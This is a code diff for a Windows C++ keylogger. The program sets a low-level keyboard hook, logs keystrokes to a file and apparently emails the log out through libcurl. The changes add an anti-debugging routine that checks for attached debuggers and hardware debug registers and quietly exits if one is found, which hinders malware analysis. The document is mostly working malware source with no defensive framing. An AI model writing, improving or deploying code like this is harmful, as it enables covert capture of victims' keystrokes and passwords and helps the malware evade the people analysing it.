@@ -3,7 +3,6 @@
 #include <string>
 #include <fstream>
 
-#include <winternl.h>
 #include <windows.h>
 #include <WinBase.h>
 #include <tchar.h>
@@ -47,12 +46,12 @@ VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
 static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp);
 void processLog();
 bool sendMail();
+void checkDebugging();
 
 //Main
 int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 {
-	//WM_KEYBOARD_LL hook
-	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
+	checkDebugging();
 
 	//Create directory for log
 	CreateDirectory(dirPath.c_str(), NULL);
@@ -84,6 +83,9 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 		FILE_ATTRIBUTE_NORMAL,
 		0);
 	SetFilePointer(logFileHandle, 0, NULL, FILE_END); //Write to end of file
+
+	//WM_KEYBOARD_LL hook
+	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
 
 	//Main cycle
 	while (GetMessage(&msg, NULL, 0, 0))
@@ -136,6 +138,7 @@ VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
 
 void processLog()
 {
+	checkDebugging();
 	if (keyLog.empty())
 		return;
 	if (mode == sendLogEmail)
@@ -197,4 +200,17 @@ bool sendMail()
 		return res == CURLE_OK;
 	}
 	else return false;
+}
+
+void checkDebugging()
+{
+	BOOL dbgPresent = FALSE;
+	CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbgPresent); //Anti-debug using NtQueryInformationProcess
+
+	CONTEXT context = {};
+	context.ContextFlags = CONTEXT_DEBUG_REGISTERS; //Check debug registers
+	GetThreadContext(GetCurrentThread(), &context);
+
+	if (IsDebuggerPresent() || dbgPresent || context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
+		exit(0);
 }
